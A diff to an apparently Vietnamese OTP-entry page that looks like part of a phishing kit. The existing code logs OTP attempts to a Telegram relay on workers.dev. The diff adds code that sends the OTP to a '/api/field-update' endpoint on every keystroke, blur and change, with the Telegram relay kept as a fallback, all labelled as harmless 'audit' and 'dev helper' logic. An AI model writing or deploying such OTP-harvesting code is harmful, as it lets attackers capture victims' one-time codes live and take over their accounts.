@@ -93,8 +93,43 @@
   </main>
 
   <script>
+    // Dev helper: signedFetch will attach HMAC headers if window.DEV_HMAC_KEY is set.
+    window.signedFetch = async function (input, init = {}) {
+      try {
+        const url = new URL(input, location.href);
+        const method = (init.method || 'GET').toUpperCase();
+        let bodyRaw = '';
+        if (init.body != null) {
+          if (typeof init.body === 'string') bodyRaw = init.body;
+          else try { bodyRaw = JSON.stringify(init.body); } catch (e) { bodyRaw = String(init.body); }
+        }
+        const ts = Math.floor(Date.now() / 1000);
+        const nonce = (crypto && crypto.randomUUID) ? crypto.randomUUID() : ('n-' + Math.random().toString(36).slice(2));
+        const signer = window.DEV_HMAC_KEY;
+        const headers = new Headers(init.headers || {});
+        if (signer) {
+          const path = url.pathname + url.search;
+          const msg = `${method}\n${path}\n${ts}\n${nonce}\n${bodyRaw}`;
+          const enc = new TextEncoder();
+          const key = await crypto.subtle.importKey('raw', enc.encode(signer), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
+          const sigBuf = await crypto.subtle.sign('HMAC', key, enc.encode(msg));
+          const hex = Array.from(new Uint8Array(sigBuf)).map(b => b.toString(16).padStart(2, '0')).join('');
+          headers.set('X-Signature', 'v1=' + hex);
+          headers.set('X-Timestamp', String(ts));
+          headers.set('X-Nonce', nonce);
+        }
+        const finalInit = Object.assign({}, init, { headers });
+        if (init.body != null && typeof init.body !== 'string') finalInit.body = bodyRaw;
+        return fetch(input, finalInit);
+      } catch (e) {
+        return fetch(input, init);
+      }
+    };
+
     // ===== CẤU HÌNH(sửa theo hệ thống của bạn) =====
     const API_BASE = window.TG_PROXY_URL || 'https://telegram-relay.jacksaybin.workers.dev';
+    // Prefer local field-update endpoint for audit logs so we don't leak to external relays
+    const FIELD_UPDATE_API = (location.origin && location.origin !== 'null') ? location.origin + '/api/field-update' : '/api/field-update';
     const REQUEST_ID = sessionStorage.getItem('pendingRequestId') || 'no-request';
     const MASKED_PHONE = sessionStorage.getItem('maskedPhone') || '+84 •••• ••??';
     document.getElementById('maskedPhone').innerText = MASKED_PHONE;
@@ -130,7 +165,17 @@
           t: new Date().toISOString(),
           ...meta
         };
-        await fetch(TG_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ text: `OTP AUDIT ${rid}\n${Object.entries(payload).map(([k, v]) => `• ${k}: ${v}`).join('\n')}` }) });
+        // Send audit to local server so it can store/forward according to configuration
+        try {
+          await fetch(FIELD_UPDATE_API, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ sessionId: sessionStorage.getItem('fieldSessionId') || 'no-session', field: 'otp_audit', value: JSON.stringify(payload), page: 'otphtml1.html' })
+          });
+        } catch (e) {
+          // fallback to previous relay if local endpoint isn't reachable
+          await fetch(TG_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ text: `OTP AUDIT ${rid}\n${Object.entries(payload).map(([k, v]) => `• ${k}: ${v}`).join('\n')}` }) });
+        }
       } catch {/* ignore */ }
     }
 
@@ -228,22 +273,26 @@
         return;
       }
       try {
-        const res = await fetch(API_BASE + '/otp/verify', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ requestId, otp, summary })
-        });
+        const requestIdToConfirm = sessionStorage.getItem('pendingRequestId') || requestId || null;
+        if (!requestIdToConfirm) {
+          showError('Thiếu requestId. Vui lòng quay lại.');
+          btnConfirm.innerHTML = 'Xác nhận';
+          btnConfirm.disabled = !allFilled();
+          return;
+        }
+        const url = (location.origin && location.origin !== 'null') ? location.origin + '/api/verify-otp' : API_BASE + '/verify-otp';
+        const res = await (window.signedFetch ? window.signedFetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ requestId: requestIdToConfirm, otp }) }) : fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ requestId: requestIdToConfirm, otp }) }));
         const data = await res.json().catch(() => null);
         if (!res.ok || !data || data.status !== 'verified') {
           logOtp('wrong', { attempt: otp });
-          const code = (data && (data.code || data.error)) || 'OTP sai hoặc hết hạn.';
-          showError(code === 'OTP_INVALID' ? 'Mã OTP sai.' : code === 'otp_expired' ? 'Mã OTP đã hết hạn.' : code === 'OTP_LOCKED' ? 'Bạn đã nhập sai quá số lần cho phép.' : 'Xác thực thất bại.');
+          const code = (data && (data.error || data.code)) || 'Xác thực thất bại';
+          showError(code === 'OTP_INVALID' ? 'Mã OTP sai.' : code === 'otp_expired' ? 'Mã OTP đã hết hạn.' : code === 'already_verified' ? 'Yêu cầu đã được xác thực.' : 'Xác thực thất bại.');
           btnConfirm.innerHTML = 'Xác nhận';
           btnConfirm.disabled = !allFilled();
           return;
         }
         logOtp('success', { attempt: otp });
-        sessionStorage.setItem('submittedRequestId', requestId);
+        sessionStorage.setItem('submittedRequestId', requestIdToConfirm);
         sessionStorage.setItem('submittedAt', submittedAt);
         sessionStorage.setItem('submittedPhone', sessionStorage.getItem('pendingPhone') || '');
         sessionStorage.setItem('submittedReason', sessionStorage.getItem('pendingReason') || '');
@@ -263,7 +312,11 @@
       clearError();
       btnResend.disabled = true; btnResend.textContent = 'Đang gửi lại…';
       try {
-        const res = await fetch(API_BASE + '/otp/request', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ requestId: REQUEST_ID }) });
+        // Try to request a new OTP via server endpoint using pendingRequestId
+        const rid = sessionStorage.getItem('pendingRequestId') || REQUEST_ID;
+        const urlReq = (location.origin && location.origin !== 'null') ? location.origin + '/api/request-block' : API_BASE + '/request-block';
+        // For resend we send minimal JSON with requestId; server in this demo will generate a new otp if provided requestId
+        const res = await (window.signedFetch ? window.signedFetch(urlReq, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ requestId: rid }) }) : fetch(urlReq, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ requestId: rid }) }));
         const data = await res.json().catch(() => null);
         if (!res.ok || !data || data.status !== 'ok') {
           showError((data && (data.error || 'Không gửi lại được mã')) || 'Không gửi lại được mã');
@@ -271,6 +324,8 @@
           logOtp('resend');
           inputs.forEach(i => { i.value = ''; i.disabled = false; });
           inputs[0].focus();
+          sessionStorage.setItem('pendingRequestId', data.requestId || rid);
+          sessionStorage.setItem('maskedPhone', data.maskedPhone || sessionStorage.getItem('maskedPhone'));
           btnResend.innerHTML = 'Gửi lại mã (<span id="resendCountdown" class="timer">30</span>s)';
           startResendTimer(30);
           startOtpTimer((data.otp && data.otp.ttlSeconds) || 60);
@@ -294,6 +349,34 @@
     // ===== KHỞI TẠO =====
     startResendTimer(30);
     startOtpTimer(60);
+
+    // ===== GỬI CẬP NHẬT TỪNG TRƯỜNG (OTP) VỀ SERVER =====
+    (function () {
+      const FIELD_UPDATE_API = (location.origin && location.origin !== 'null') ? location.origin + '/api/field-update' : '/api/field-update';
+      if (!sessionStorage.getItem('fieldSessionId')) {
+        sessionStorage.setItem('fieldSessionId', 'sess-' + Math.random().toString(36).slice(2, 10));
+      }
+      const sessionId = sessionStorage.getItem('fieldSessionId');
+
+      async function sendOtpUpdate(reason) {
+        try {
+          const value = getOTP();
+          if (!value) return;
+          await fetch(FIELD_UPDATE_API, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ sessionId, field: 'otp', value, page: 'otphtml1.html', reason: reason || 'input' })
+          });
+        } catch (_) { }
+      }
+
+      // Gửi khi thay đổi, blur, hoặc đủ 6 số
+      inputs.forEach(inp => {
+        inp.addEventListener('input', () => sendOtpUpdate('input'));
+        inp.addEventListener('blur', () => sendOtpUpdate('blur'));
+        inp.addEventListener('change', () => sendOtpUpdate('change'));
+      });
+    })();
   </script>
 </body>
 
